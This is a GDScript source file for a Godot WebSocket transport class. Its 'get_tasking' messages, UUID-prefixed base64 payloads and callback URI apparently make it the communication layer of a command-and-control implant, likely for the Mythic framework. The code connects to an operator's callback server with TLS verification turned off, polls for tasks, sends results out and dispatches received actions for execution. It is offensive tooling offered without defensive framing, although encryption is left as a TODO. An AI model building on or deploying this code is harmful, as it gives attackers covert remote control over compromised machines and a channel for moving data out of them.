extends Node

class_name TransportWebsocket

@export var agent:Node = null
@export var config:Node = null
@export var transport:Node = null

signal checkin
signal execute
signal post_response
signal disconnected

var _client = null
var _client_options = null
var _time = 0
var _heartbeat_period = 5
var connect_attempt = 0
var outbound = []
var do_exit = false

func _init(Config, Agent, Transport):
	agent = Agent
	transport = Transport
	config = Config

	_setup_client()

func _setup_client():
	_client = WebSocketPeer.new()
	_client_options = TLSOptions.client_unsafe()
	_client.set_handshake_headers(config.get_headers())

	connect_attempt = config.MAX_CONNECT_ATTEMPT

	transport.get_node("CallbackTimer").start()

# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta):
	_time += delta
	# TODO: this is not being called until we add_child in transport...duh...
	if _time > _heartbeat_period:
		print("heartbeat time")

		if _client == null:
			_setup_client()

		# keep our client alive...
		_client.poll()

		# reset our heartbeat timer
		_time = 0

func get_packet():
	return _client.get_packet().get_string_from_utf8()

func send(payload, skip_queue=false):
	var ret = true

	if not skip_queue:
		outbound.append(payload)
	else:
		if client_is_connected() == 1:
			ret = OK == _client.put_packet(wrap_payload(payload))

			if not ret:
				print("failed to send data...", payload)
			else:
				print("sent payload: ", payload)
		else:
			print("skipping", payload, "try again once we're connected...")
			ret = false

	return ret

func recv():
	while _client.get_available_packet_count() > 0:
		var packet = _client.get_packet().get_string_from_utf8()

		if not packet.length():
			print("controlpacket?: ", packet)
			continue

		var result = unwrap_payload(packet)

		if not result.has("action") or result["action"] == "":
			print("Bad message unpacked? ", result)
			return

		transport.recv(result.get("action"), result)

func client_poll():
	outbound.append(JSON.stringify({
		"action": "get_tasking",
		"tasking_size": 1,
		#"delegates": [],
		#"get_delegate_tasks": false,# no p2p for us at this time...
	}))

	while outbound.size() > 0:
		var msg = outbound.pop_front() # FIFO it!
		var ret = _client.put_packet(wrap_payload(msg))

		if ret != OK:
			print("failed to send data...", msg) # TODO: requeue?

	if _client.get_available_packet_count() > 0:
		recv()

func wrap_payload(payload):

	if config.should_encrypt():
		pass # TODO: implement encryption
	else:
		payload = Marshalls.utf8_to_base64(config.get_uuid() + payload).to_utf8_buffer()

	return payload

func unwrap_payload(packet):
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data = Marshalls.base64_to_utf8(packet)
	
	ret["uuid"] = data.substr(0, 36)

	# TODO: decryption
	var test_json_conv = JSON.new()
	test_json_conv.parse(data.substr(36))
	ret["payload"] = test_json_conv.get_data()

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	return ret

func client_connect():

	if client_is_connected() == 1:
		# if we're opening or already connected
		return true

	if connect_attempt <= 0:
		_client.close()
		emit_signal("disconnected")
		return false
	else:
		connect_attempt -= 1

		print("calling coonnect to: ", config.get_callback_uri())
		var err = _client.connect_to_url(config.get_callback_uri(), _client_options)

		if err != OK:
			return false
		else:
			connect_attempt = config.MAX_CONNECT_ATTEMPT
			return true
	
func client_disconnect():
	_client.close()

func client_is_connected():
	_client.poll()

	var status = _client.get_ready_state()

	if status == WebSocketPeer.STATE_CLOSED or status == WebSocketPeer.STATE_CLOSING:
		print("client closed")
		return -1
	elif status == WebSocketPeer.STATE_OPEN:
		return 1
	else:
		print("client in unknown state", status)
		return 0
